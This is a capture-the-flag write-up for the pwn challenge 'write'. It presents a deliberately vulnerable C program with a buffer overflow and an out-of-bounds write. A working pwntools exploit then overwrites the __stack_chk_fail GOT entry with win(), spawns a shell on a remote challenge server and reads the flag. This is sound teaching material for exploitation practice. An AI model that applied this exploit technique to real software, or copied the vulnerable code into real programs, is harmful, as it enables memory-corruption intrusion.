# write : Pwn

Oneshot.

Attachment  
[write.tar.gz](write.tar.gz)  

Tags : Buffer Overflow, Stack Canary, Out-Of-Bounds Write, GOT Overwrite, Win Function  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

ssize_t array[10];

void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}

#define getval(msg)                             \
  ({                                            \
    char buf[0x20] = {};                        \
    write(STDOUT_FILENO, msg, strlen(msg));     \
    read(STDIN_FILENO, buf, sizeof(buf)*0x20);  \
    atoll(buf);                                 \
  })

int main() {
  ssize_t index, value;
  index = getval("index: ");
  value = getval("value: ");
  array[index] = value;
  return 0;
}
```
This code reveals the existence of win().  
In addition, there is BOF at `read` and OOB write at `array[index]=value`.
```
$ checksec chall
[*] '/mnt/c/Users/NAEL/Desktop/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
The apploach is as follows:
* Overwrite the GOT of `__stack_chk_fail` to `win` address using OOB write.
* Overwrite the canary value using BOF and trigger calling `win` function.

The offset from array to `__stack_chk_fail` GOT is 0x60. So, index is `-12`.
```
$ readelf -a chall
...
000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
...
    20: 0000000000404080    80 OBJECT  GLOBAL DEFAULT   26 array
...
```
The offset from `array[-12]` to return address is `0x60+0x38=0x98`
```
$ objdump -M intel -d chall
...
  4012a3:       48 8d 45 d0             lea    rax,[rbp-0x30]
  4012a7:       ba 00 04 00 00          mov    edx,0x400
  4012ac:       48 89 c6                mov    rsi,rax
  4012af:       bf 00 00 00 00          mov    edi,0x0
  4012b4:       e8 e7 fd ff ff          call   4010a0 <read@plt>
...
```

The steps are as follows:
 * set the index with `-12`
 * set the value with `win` address and overwrite the canary value

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./chall")

context.arch = 'amd64'

p = remote("34.170.146.252", 63475)

p.sendlineafter(b"index: ", b"-12")

win_addr = elf.symbols["win"]
payload = str(win_addr).encode() + p64(0) + b"\x00"*0x100

p.sendlineafter(b"value: ", payload)

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 63475: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag-957b3467e94eb8cd41dac6478f23d8ad.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag*
RTACTF{__stack_chk_fail-is-s0m3t1m3s-useful}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 63475
[*] Got EOF while sending in interactive
```

Get the flag!

`RTACTF{__stack_chk_fail-is-s0m3t1m3s-useful}`
